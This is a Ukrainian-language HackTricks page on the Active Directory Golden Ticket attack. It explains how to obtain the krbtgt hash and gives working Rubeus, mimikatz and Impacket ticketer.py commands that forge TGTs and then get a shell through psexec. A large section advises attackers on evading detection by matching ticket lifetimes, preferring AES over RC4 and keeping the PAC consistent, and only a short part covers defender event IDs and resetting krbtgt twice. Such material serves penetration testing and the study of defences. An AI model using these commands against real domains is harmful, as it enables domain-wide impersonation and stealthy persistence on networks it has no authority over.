# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Атака **Golden Ticket** полягає у **створенні легітимного Ticket Granting Ticket (TGT) з імітацією будь-якого користувача** за допомогою **NTLM hash облікового запису Active Directory (AD) krbtgt**. Ця техніка особливо вигідна, оскільки **надає доступ до будь-якого сервісу або машини** в межах домену від імені користувача, якого імітують. Важливо пам'ятати, що **облікові дані облікового запису krbtgt ніколи не оновлюються автоматично**.<sup>[[1]](#references)</sup>

Для **отримання NTLM hash** облікового запису krbtgt можна застосувати різні методи. Його можна видобути з **процесу Local Security Authority Subsystem Service (LSASS)** або файлу **NT Directory Services (NTDS.dit)**, розташованого на будь-якому Domain Controller (DC) у домені. Крім того, ще однією стратегією отримання цього NTLM hash є **виконання DCsync attack**, яку можна здійснити за допомогою таких інструментів, як **модуль lsadump::dcsync** у Mimikatz або **скрипт secretsdump.py** від Impacket. Важливо підкреслити, що для виконання цих операцій зазвичай потрібні **права domain admin або аналогічний рівень доступу**.<sup>[[2]](#references)</sup>

Хоча NTLM hash є придатним методом для цієї мети, з міркувань операційної безпеки **настійно рекомендується** **підробляти tickets за допомогою ключів Advanced Encryption Standard (AES) Kerberos (AES128 і AES256)**. Це ще важливіше в сучасних доменах, оскільки **використання RC4 поступово припиняється**, а в телеметрії Kerberos воно стає значно помітнішим.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Сучасні нотатки щодо створення ticket

Якщо можливо, спочатку **запитайте LDAP і SYSVOL**, а потім forge ticket, використовуючи реальну domain policy та значення PAC користувача, замість того щоб вигадувати їх вручну:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` запитує DC щодо даних користувача, групи, NetBIOS і політик, які використовуються для створення реалістичнішого PAC.
- `/printcmd` виводить offline командний рядок, що містить отримані поля PAC; це корисно, якщо пізніше потрібно буде підробити той самий ticket без повторного звернення до LDAP.
- `/extendedupndns` додає нові елементи `UpnDns` PAC, що містять `samAccountName` і SID облікового запису.
- `/oldpac` видаляє нові буфери `Requestor` і `Attributes` PAC; це переважно корисно для перевірки сумісності зі старішими середовищами, а не для використання за замовчуванням.

From Linux останні версії Impacket також підтримують додавання нових структур PAC і встановлення реалістичного періоду дії:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` вказується в **годинах**. За замовчуванням — **10 років**, що є шумним.
- `-extra-pac` додає новішу інформацію PAC `UPN_DNS`.
- `-old-pac` примусово використовує застарілий формат PAC.
- `-extra-sid` корисний, коли PAC потребує додаткових SID (наприклад, у сценаріях ескалації з дочірнього домену до батьківського, які розглядаються в [SID-History Injection](sid-history-injection.md)).

**Після** ін'єкції **Golden Ticket** ви можете отримати доступ до спільних файлів **(C$)** і виконувати services та WMI, тож можете використати **psexec** або **wmiexec**, щоб отримати shell (схоже, отримати shell через winrm неможливо).

### Обхід поширених засобів виявлення

Найпоширеніший спосіб виявити Golden Ticket — **перевірити трафік Kerberos** у мережі. За замовчуванням Mimikatz **підписує TGT на 10 років**, що виглядатиме аномально в наступних TGS-запитах, виконаних із його використанням.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Використовуйте параметри `/startoffset`, `/endin` і `/renewmax`, щоб контролювати початкове зміщення, тривалість і максимальну кількість поновлень (усі значення вказуються в хвилинах).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
На жаль, час життя TGT не реєструється в подіях 4769, тому ви не знайдете цю інформацію в журналах подій Windows. Однак можна виявити кореляцію, **побачивши події 4769 без попередньої події 4768**. **Неможливо запитати TGS без TGT**, і якщо немає запису про видачу TGT, можна зробити висновок, що його було підроблено offline.

У **новіших збірках Windows** ідентифікатори подій **4768** та **4769** також містять значно кращу **телеметрію типів шифрування**. Підроблений TGT/TGS із використанням **RC4 (`0x17`)** у домені, де `krbtgt`, клієнти та служби вже мають ключі AES, набагато легше виявити, ніж кілька років тому. Це ще одна причина віддавати перевагу **AES-backed Golden Tickets** і якомога точніше відповідати стандартній політиці Kerberos у домені.

Ще однією проблемою OPSEC є **відповідність PAC**. Квитки з неможливими членствами в групах, відсутніми новішими буферами PAC або метаданими облікового запису, які не відповідають LDAP, легше виявити, коли захисники перевіряють вміст PAC за даними AD. Якщо вам потрібен TGT, який виглядає так, ніби його справді видав DC, перегляньте:

{{#ref}}
diamond-ticket.md
{{#endref}}

Існують також **обмеження середовища** для persistence. Обліковий запис `krbtgt` зберігає **історію з 2 паролів**, тому підроблений TGT може залишатися дійсним після **першого** скидання `krbtgt`, якщо його було підписано попереднім ключем. Саме тому захисники роблять Golden Tickets недійсними, **двічі скидаючи `krbtgt`** і очікуючи щонайменше максимальний час життя квитка в домені між скиданнями.<sup>[[3]](#references)</sup>

Щоб **обійти цю перевірку виявлення**, перевірте diamond tickets.

### Заходи пом’якшення

- 4624: Вхід облікового запису
- 4672: Вхід адміністратора
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Інші невеликі хитрощі, які можуть застосувати захисники: **створювати сповіщення про події 4769 для важливих користувачів**, наприклад стандартного облікового запису адміністратора домену, а також створювати сповіщення про **використання RC4 для `krbtgt`** у доменах, які зазвичай видають квитки AES.<sup>[[5]](#references)</sup>

## References

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
